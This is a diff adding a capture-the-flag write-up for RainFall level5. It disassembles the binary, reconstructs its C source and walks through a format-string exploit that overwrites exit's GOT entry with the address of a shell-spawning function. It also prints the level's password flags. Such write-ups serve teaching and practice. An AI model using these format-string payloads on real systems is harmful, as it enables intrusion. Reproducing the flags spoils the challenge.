@@ -991,13 +991,240 @@ echo -n -e '\x10\x98\x04\x08%16930112x%12$n' >  /tmp/lol ; cat /tmp/lol - | ./le
 
 ## Level5
 
-- [`objdump -d` output]()
+- [`objdump -d` output](http://ix.io/2cFu)
 
 ### ASM Interpretation
 
+```asm
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048504 <+0>:	push   ebp
+   0x08048505 <+1>:	mov    ebp,esp
+
+   0x08048507 <+3>:	and    esp,0xfffffff0
+   0x0804850a <+6>:	call   0x80484c2 <n> ; call n function
+
+   0x0804850f <+11>:	leave
+   0x08048510 <+12>:	ret
+End of assembler dump.
+
+(gdb) disas n
+Dump of assembler code for function n:
+   0x080484c2 <+0>:	push   ebp
+   0x080484c3 <+1>:	mov    ebp,esp
+
+   0x080484c5 <+3>:	sub    esp,0x218 ; Allocate 0x218 bytes on the stack (528)
+   0x080484cb <+9>:	mov    eax,ds:0x8049848 ; Set eax to stdin@@GLIBC_2.0
+   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax ; Set eax to 3rd argument of fgets()
+   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200 ; Set 512 to 2nd argument of fgets()
+   0x080484dc <+26>:	lea    eax,[ebp-0x208] ; Set eax to 520th byte of the stack
+   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax ; Set eax as 1st argument of fgets()
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt> ; Call fgets(&buffer[16], 512, stdin); (512 + 16) > 528 so a buffer overflow is possible ...
+     ;  char *fgets(char * restrict str, int size, FILE * restrict stream);
+   0x080484ea <+40>:	lea    eax,[ebp-0x208] ; Set eax to 16th first byte of the stack
+   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax ; Set eax to 1st argument of printf()
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt> ; Call printf(eax) / printf(&buffer[16])
+     ; int printf(const char * restrict format, ...);
+   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1 ; Set 1 as 1st argument of exit
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt> ; Call exit(1)
+     ; void exit(int status);
+End of assembler dump.
+
+# If we look closely at the assembly code, we can find the o function, which is not called
+(gdb) disas o
+Dump of assembler code for function o:
+   0x080484a4 <+0>:	push   ebp
+   0x080484a5 <+1>:	mov    ebp,esp
+
+   0x080484a7 <+3>:	sub    esp,0x18
+   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0 ; (gdb) printf "%s", 0x80485f0 -> "/bin/sh"
+   0x080484b1 <+13>:	call   0x80483b0 <system@plt> ; Call system("/bin/sh");
+   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1 ; Set 1 as 1st argument of exit
+   0x080484bd <+25>:	call   0x8048390 <_exit@plt> ; Call exit(1)
+End of assembler dump.
+```
+
 ### Equivalent C source code
 
+```c
+#include <stdio.h>
+
+void	o(void) {
+	system("/bin/sh");
+	exit(1);
+}
+
+void	n(void) {
+	unsigned char buffer[528];
+	
+	fgets(&buffer[16], 512, stdin);
+	printf(&buffer[16]);
+	exit(1);
+}
+
+int		main(int ac, char **av) {
+	n();
+	return 0;
+}
+
+# Compiled with -fpic
+```
+
 ### Walktrough
+
+```bash
+# Find the index of the string
+level5@RainFall:~$ (for i in {1..500}; do echo -n -e 'BBBB%'${i}'$x' > /tmp/lol ; echo -n $i": "; cat /tmp/lol2 | ./level5 ; echo ; done;) | grep 42424242
+4: BBBB42424242
+
+# Check if we can make the program segfault
+level5@RainFall:~$ echo 'BBBB%4$s' | ./level5
+Segmentation fault (core dumped)
+```
+
+#### Finding saved EIP address
+
+To find the saved EIP of the program, we can use the ability to make the program segfault in cordination with gdb
+
+- Make the program SEGV:
+
+```bash
+(gdb) run <<< 'BBBB%4$x'
+Starting program: /home/user/level5/level5 <<< 'BBBB%4$x'
+BBBB42424242
+[Inferior 1 (process 12790) exited with code 01]
+(gdb) run <<< 'BBBB%4$s'
+Starting program: /home/user/level5/level5 <<< 'BBBB%4$s'
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e70003 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+```
+
+- Once the program has received the segv signal, check the backtrace of the program
+
+```bash
+(gdb) bt
+#0  0xb7e70003 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+#1  0xb7e7887f in printf () from /lib/i386-linux-gnu/libc.so.6
+#2  0x080484f8 in n ()
+#3  0x0804850f in main ()
+```
+
+- In our case, we want to modify the saved EIP of the n() function to avoid the exit() function call and instead jump into the o() function
+
+- Use the `info frame` command with the index of the frame
+
+```
+(gdb) info  frame 1
+Stack frame at 0xbffff480:
+ eip = 0xb7e7887f in printf; saved eip 0x80484f8
+ called by frame at 0xbffff6a0, caller of frame at 0xbffff460
+ Arglist at 0xbffff460, args:
+ Locals at 0xbffff460, Previous frame's sp is 0xbffff480
+ Saved registers:
+  ebx at 0xbffff478, eip at [0xbffff47c]
+
+(gdb) info  frame 2
+Stack frame at 0xbffff6a0:
+ eip = 0x80484f8 in n; saved eip 0x804850f
+ called by frame at 0xbffff6b0, caller of frame at 0xbffff480
+ Arglist at 0xbffff698, args:
+ Locals at 0xbffff698, Previous frame's sp is 0xbffff6a0
+ Saved registers:
+  ebp at 0xbffff698, [eip at 0xbffff69c]
+```
+
+- Try to overwrite the address of the saved EIP !
+
+```bash
+level5@RainFall:~$ echo -n -e '\x7c\xf4\xff\xbf%4$s' | ./level5 | xxd
+0000000: 7cf4 ffbf 7f88 e7b7 201a fdb7 b0f4 ffbf  |....... .......
+0000010: a4f4 ffbf 5088 e7b7 b0f4 ffbf 18f9 ffb7  ....P...........
+0000020: f40f fdb7 f884 0408 b0f4 ffbf            ............
+
+level5@RainFall:~$ echo -n -e '\x7c\xf4\xff\xbf%4$n' | ./level5
+Segmentation fault (core dumped)
+
+level5@RainFall:~$ echo -n -e '\x7c\xf4\xff\xbf%4$n' > /tmp/lol
+
+level5@RainFall:~$ gdb ./level5
+(gdb) run < /tmp/lol
+Starting program: /home/user/level5/level5 < /tmp/input
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000004 in ?? ()
+
+level5@RainFall:~$ echo -n -e '\x7c\xf4\xff\xbf%134513824$n' > /tmp/lol # Address of o() minus 4 first printed bytes
+
+(gdb) run < /tmp/lol
+The program being debugged has been started already.
+Start it from the beginning? (y or n) yy
+Starting program: /home/user/level5/level5 < /tmp/lol
+|�[Inferior 1 (process 3572) exited with code 01]
+
+```
+
+This didn't worked ... maybe another solution is possible ? 
+
+### Overwriting exit from PLT
+
+- [GOT and PLT for pwning.
+](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)
+
+- [How to Hijack the Global Offset Table with pointers
+](https://www.exploit-db.com/papers/13203)
+
+```bash
+level5@RainFall:~$ objdump  -R ./level5
+
+./level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+```
+
+- We can see that the address of the exit syscall is located at the address `08049838` of our PLT table
+
+```bash
+level5@RainFall:~$ objdump  -d ./level5
+...
+080483d0 <exit@plt>:
+ 80483d0:       ff 25 38 98 04 08       jmp    *0x8049838
+ 80483d6:       68 28 00 00 00          push   $0x28
+ 80483db:       e9 90 ff ff ff          jmp    8048370 <_init+0x3c>
+...
+```
+
+```bash
+(gdb) disas 0x8049838
+Dump of assembler code for function exit@got.plt:
+   0x08049838 <+0>:     (bad)
+   0x08049839 <+1>:     add    DWORD PTR [eax+ecx*1],0xffffffe6
+End of assembler dump.
+```
+
+- So when exit() is called, the function will jump to the address stored in this address, let's stry to overwrite it with the address of o()
+
+```bash
+level5@RainFall:~$ echo -n -e '\x38\x98\x04\x08%134513824x%4$n' > /tmp/lol
+
+level5@RainFall:~$ cat /tmp/lol  - | ./level5
+# Prints a lot of spaces
+200ls
+ls
+ls: cannot open directory .: Permission denied
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
 
 ## Misc / References
 
@@ -1074,4 +1301,5 @@ level2 -> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 level3 -> 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 level4 -> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 level5 -> 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+level6 -> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
